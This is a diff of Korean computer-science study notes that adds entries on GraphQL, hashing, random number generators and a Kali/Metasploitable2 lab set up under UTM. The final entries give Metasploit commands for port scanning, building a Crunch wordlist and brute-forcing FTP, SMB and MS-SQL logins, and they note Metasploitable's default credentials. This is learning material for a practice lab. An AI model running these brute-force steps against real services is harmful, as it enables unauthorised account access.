@@ -248,7 +248,7 @@ This is about computer science faced while studying or working.
             2. Controller는 사용자의 Action를 확인하고, Model을 업데이트합니다.
             3. Controller는 Model을 나타내줄 View를 선택합니다.
             4. View는 Model을 이용하여 화면을 나타냅니다.
-     1. MVP(Model, View, Presenter)
+     2. MVP(Model, View, Presenter)
         1. 구성
            1. Model
            2. View
@@ -261,5 +261,107 @@ This is about computer science faced while studying or working.
            4. Model은 Presenter에서 요청받은 데이터를 응답합니다.
            5. Presenter는 View에게 데이터를 응답합니다.
            6. View는 Presenter가 응답한 데이터를 이용하여 화면을 나타냅니다.
-  50. py set default version
+50. py set default version
       1.  power shell 관리자 모드에서 ``$env:PY_PYTHON = 3.7``
+51. Rest API가 갖고 있는 문제점
+    1.  Overfetching-problem
+    2.  Underfetching-problem
+52. Rest API의 문제점을 해결하기 위해 나온 것이 GraphQL
+53. Hash
+    1.  Modular function
+        1.  One-way function
+            1.  한 번 결과가 나오면 돌아갈 수 없다.
+            2.  예를 들어 ``mod12``를 해서 ``3``이 나오는 경우는 무한히 많다.
+            1.  이를 이용해 암호화를 할 수 있고, ``Hash``함수에 많이 사용된다.
+    2.  공개키 암호화
+    3.  checksum
+    4.  블록체인
+    5.  Rolling hash
+        1.  X<sub>n</sub> = (aX<sub>n-1</sub> + S<sub>i</sub>) mod M
+            1.  S는 문자열이다.
+            2.  a가 아스키 코드라고 한다면 0~255개
+            3.  M이 소수로 잡으면 값의 분포도가 넓게 퍼지기 때문에 좋다.
+            4.  문자열 처리를 위한 방법
+54. 유사난수(pseudo-random number)
+    1.  실제로는 난수가 아닌데 알고리즘에 의해 랜덤 난수처럼 보이는 수열
+55. 모듈러 함수의 특징
+    1.  주기성
+    2.  예를 들어 ``mod3``이면 입력 값이 초과해서 3의 범위 내로 돌아온다.
+    3.  순환성
+56. RNG Device(Random Number Generator)
+    1.  난수 생성을 위한 방법
+        1.  종류
+            1.  Hardware RNG
+                1.  임베디드 환경이나 보안요구 조건이 높은 곳에서 사용됨.
+                2.  주변의 소음, 노이즈, 잡음 등 랜덤한 물리적 프로세스를 측정하여 랜덤 비트를 생성한다.
+            2.  Software RNG
+                1.  난수 생성 알고리즘에 의해 난수를 생성하며 일정한 규칙이 있다.
+57. LCG(Linear Congruential Generator)
+    1.  선형 합동 생성기
+    2.  일정한 주기를 갖고 있어 실제 보안이 필요한 곳에서는 사용되지 않는다.
+    3.  X<sub>n+1</sub> = (aX<sub>n</sub>+c) % m
+    4.  이 때 최대 주기는 m이다.
+58. MAC의 UTM을 이용해서 kali, metasploitable2 설치
+    1.  UTM
+        1.  맥OS와 Apple platform을 위해 개발된 Virtualize solution
+        2.  QEMU 하이퍼바이저로 돌아간다.
+        3.  하이퍼바이저
+            1.  게스트 운영체제와 그 운영체제에서 돌아가는 소프트웨어를 분리시켜 가상화를 해준다.
+    2.  포인트는 둘 다 ``bridge``네트워크를 구성하는 것이다.
+    3.  kali 설치
+        1.  kali image를 받는다.
+        2.  새 가상머신 > Virtualize
+        3.  QEMU
+            1.  UTM
+    4.  metasploitable2
+        1.  metasploitable2를 받는다.
+        2.  새 가상머신 > Emulate > Other > skip ISO boot 저장
+        3.  설정열고 IDE Drive 삭제하고 드라이브 추가해서 ``metasploitable.vmdk``를 ``import``하고 부팅하면 된다.
+        4.  기본 패스워드는 ``msfadmin/msfadmin``
+    5.  다 설치 후 ``ping test``를 하면 잘 통신된다.
+59. msf
+    1.  포트 스캔
+        1.  ``service postgresql start``
+        2.  ``msfdb init``
+            1.  최초 한 번만
+        3.  ``msfconsole``
+        4.  ``db_nmap -sT -sV -O ip``
+        5.  ``db_services``
+    2.  brute-force-attack
+        1.  준비
+            1.  Crunch
+                1.  무차별 대입 공격에 필요한 비밀번호 항목을 생성할 수 있다.
+                2.  ``crunch 1 4 -f /usr/share/crunch/charset.lst numeric -o /root/passwords.txt``
+            2.  ``cat >> /root/passwords.txt`` ``postgres``
+            3.  ``cat >> /root/users.txt`` ``administrator`` ``sa`` ``root`` ``postgres``
+        2.  시작
+            1.  FTP Service
+                1.  ``use auxiliary/scanner/ftp/ftp_login``
+                2.  ``set rhosts ip``
+                3.  ``set user_file /root/users.txt``
+                4.  ``set pass_file /root/passwords.txt``
+                5.  ``set stop_on_success true``
+                6.  ``set threads 256``
+                7.  ``run``
+            2.  SMB Service
+                1.  ``use auxiliary/scanner/smb/smb_login``
+                2.  ``set rhosts ip``
+                3.  ``set user_file /root/users.txt``
+                4.  ``set pass_file /root/passwords.txt``
+                5.  ``set stop_on_success true``
+                6.  ``set threads 256``
+                7.  ``run``
+            3.  MS-SQL
+                1.  ``use auxiliary/scanner/mssql/mssql_login``
+                2.  ``set rhosts ip``
+                3.  ``set rport 1433``
+                4.  ``set user_file /root/users.txt``
+                5.  ``set pass_file /root/passwords.txt``
+                6.  ``set stop_on_success true``
+                7.  ``set threads 256``
+                8.  ``run``
+            4.  MYSQL
+                1.  3306
+            5.  Postgresql
+                1.  5432
+60. ![Payload](ref/payload.webp)
